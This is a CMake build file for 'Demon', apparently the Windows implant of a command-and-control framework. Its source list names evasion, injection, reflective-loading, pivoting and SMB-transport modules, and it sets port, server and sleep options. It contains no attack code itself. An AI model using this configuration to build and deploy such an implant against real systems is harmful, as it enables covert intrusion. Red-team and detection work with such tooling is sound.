cmake_minimum_required(VERSION 3.19)
project( Demon C )

set( PROJECT_NAME Demon )

# set compiler settings
set( CMAKE_C_STANDARD 11 )
set( CMAKE_C_COMPILER x86_64-w64-mingw32-gcc )
set( CMAKE_C_FLAGS "-Wl,--pic-executable,-e,main -Wl,-Bstatic -s -w -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libgcc -Wl,-Bstatic " )

# adding demon sources
include_directories( Include )

set( COMMON_SOURCE Source/Core/Core.c
        Source/Core/Command.c
        Source/Core/WinUtils.c
        Source/Core/Win32.c
        Source/Core/MiniStd.c
        Source/Core/Token.c
        Source/Core/Package.c
        Source/Core/SleepObf.c
        Source/Core/Spoof.c
        Source/Core/Syscalls.c
        Source/Core/Command.c
        Source/Core/Transport.c
        Source/Core/Parser.c
        Source/Core/Pivot.c
        Source/Core/Config.c
        Source/Core/Jobs.c

        Source/Extra/KaynLdr.c
)

set( INJECT_SOURCE
        Source/Inject/Inject.c
        Source/Inject/InjectUtil.c
)

set( LOADER_SOURCE
        Source/Loader/CoffeeLdr.c
        Source/Loader/ObjectApi.c
        Source/Extra/KaynLdr.c
)

set( MAIN_SOURCE
        # windows exe
        Source/Main/MainExe.c

        # windows dll
        Source/Main/MainDll.c

        # windows reflective dll
        Source/Main/MainReflectiveDll.c
)

set( CRYPT_SOURCE
        Source/Crypt/AesCrypt.c
        Source/Crypt/XorCrypt.c
)

# preprocessor flags
add_compile_definitions( DEBUG )
add_compile_definitions( TRANSPORT_SMB )
add_compile_definitions( AES256 )
add_compile_definitions( PORT=4545 )          # 4545
add_compile_definitions( SERVER=69 )
add_compile_definitions( SLEEP=2 )
add_compile_definitions( REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR )

# linking library
link_libraries( netapi32 ws2_32 wsock32 wtsapi32 iphlpapi mscoree mscorlib )

# add compiled demons
add_executable( ${PROJECT_NAME} ${COMMON_SOURCE} ${INJECT_SOURCE} ${EXT_SOURCE} ${CRYPT_SOURCE} ${LOADER_SOURCE} ${MAIN_SOURCE} )
